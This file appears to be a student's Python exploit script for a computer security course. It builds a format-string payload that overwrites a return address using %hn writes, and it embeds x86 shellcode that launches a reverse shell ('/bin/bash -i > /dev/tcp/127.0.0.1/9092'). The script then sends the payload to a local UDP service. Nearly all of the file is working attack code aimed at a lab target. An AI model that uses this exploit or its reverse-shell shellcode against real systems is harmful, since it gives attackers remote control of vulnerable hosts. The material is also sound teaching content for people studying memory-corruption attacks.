#!/usr/bin/python3

# Made by Chirag for CSE643: Computer Security

import sys, os

shellcode= (
    # Push the command '/bin////bash' into stack (//// is equivalent to /)
    "\x31\xc0"                      # xorl %eax,%eax
    "\x50"                          # pushl %eax
    "\x68""bash"                    # pushl "bash"
    "\x68""////"                    # pushl "////"
    "\x68""/bin"                    # pushl "/bin"
    "\x89\xe3"                      # movl %esp, %ebx  

    # Push the 1st argument '-ccc' into stack (-ccc is equivalent to -c)
    "\x31\xc0"                      # xorl %eax,%eax
    "\x50"                          # pushl %eax
    "\x68""-ccc"                    # pushl "-ccc"
    "\x89\xe0"                      # movl %esp, %eax


    # Push the 2nd argument '/bin/bash -i > /dev/tcp/127.0.0.1/9092' into stack
    "\x31\xd2"                      # xorl %edx,%edx
    "\x52"                          # pushl %edx
    "\x68"">&1 "
    "\x68""&1 2"
    "\x68""2 0<"
    "\x68""/909"
    "\x68"".0.1"
    "\x68""27.0"
    "\x68""cp/1"
    "\x68""ev/t"
    "\x68""> /d"
    "\x68""h -i"
    "\x68""/bas"
    "\x68""/bin"
    "\x89\xe2"                      # movl %esp,%edx

    # Construct the argv[] array and set ecx
    "\x31\xc9"                      # xorl %ecx,%ecx
    "\x51"                          # pushl %ecx
    "\x52"                          # pushl %edx
    "\x50"                          # pushl %eax
    "\x53"                          # pushl %ebx
    "\x89\xe1"                      # movl %esp,%ecx  

    # Set edx to 0
    "\x31\xd2"                      #xorl %edx,%edx  

    # Invoke the system call
    "\x31\xc0"                      # xorl %eax,%eax
    "\xb0\x0b"                      # movb $0x0b,%al
    "\xcd\x80"                      # int $0x80
).encode('latin-1')

def ft_create_fmt(t_addr, r_addr, count):
    # cpnvert target address from  hex to int
    t_addr = int(t_addr,16)
    # split address to write into 4 byes and 4 bytes
    # ex: 0xaabbccdd r = [int(aabb, 16), int(ccdd,16)]
    r = [int(r_addr[2:6], 16),int(r_addr[-4:], 16)]
    r1 = r2 = 0
    t1 = t2 = 0

    # ensuring that the smaller part of the return address
    # gets overwritten first
    if r[0] > r[1]:
        t1 = t_addr
        t2 = t_addr + 2
        r2 = r[0]
        r1 = r[1]
    else:
        t1 = t_addr + 2
        t2 = t_addr
        r2 = r[1]
        r1 = r[0]


    # create a format string  as <addr1>@@@@<addr2>%.8x...count times
    fmt = t1.to_bytes(4,byteorder = 'little')
    fmt += "@@@@".encode()
    fmt += t2.to_bytes(4,byteorder = 'little')
    fmt += ("".join(["%.8x" * count])).encode()

    # completing the format string to overwrite target address with replace address
    printed = 12 + count * 8        # calculating characters printed so far
    z = r1 - printed                # calculating characters to print to write the smaller address
    k = r2 - r1                     # calculating balance for larger number
   
    # complete format string as <addr1>@@@@<addr2>%.8x..count times..%.zx%n%.kx%n
    fmt = fmt + ("%." +str(z) + "x%hn" ).encode()
    fmt = fmt + ("%." +str(k) + "x%hn" ).encode()

    return fmt

def ft_create_payload(t_addr, r_addr, count):
    fmt = ft_create_fmt(t_addr, r_addr, count)

    payload = fmt + b"\x90" *100 + shellcode
    # print(len(payload))

    return payload

def attack(payload):
    fp = open("payload",'wb')
    fp.write(payload)
    fp.close()

    os.system("/bin/bash -c \"cat payload > /dev/udp/127.0.0.1/9090\"")
    return

def main(argv):
    if "-H" in argv or '--help' in argv or "-h" in argv:
        print("Usage: ./myscipt.py -t <t_add> -c <%.8x...c> -t <replace value>")
        print("-t : target address in the format 0xaabbccdd")
        print("-c : count of %.8x")
        print("-r : address to be filled in the format 0xaabbccdd")
        print("--shell: to invoke a shellcode using format string")
        print("Warning: This program works for certain cases and is not tested on all possible cases!")
    else:
        if len(argv) != 7 and "--shell" not in argv:
            print("invalid aruguments")
            return
        elif len(argv) != 8 and "--shell" in argv:
            print("invalid aruguments")
            return
        t_addr = argv[argv.index("-t")+1]
        r_addr = argv[argv.index("-r")+1]
        count =int(argv[argv.index("-c")+1])
        if "--shell" not in argv:
            payload = ft_create_fmt(t_addr, r_addr, count)
        else:
            payload = ft_create_payload(t_addr, r_addr, count)
        attack(payload)

if __name__ == '__main__':
    main(sys.argv)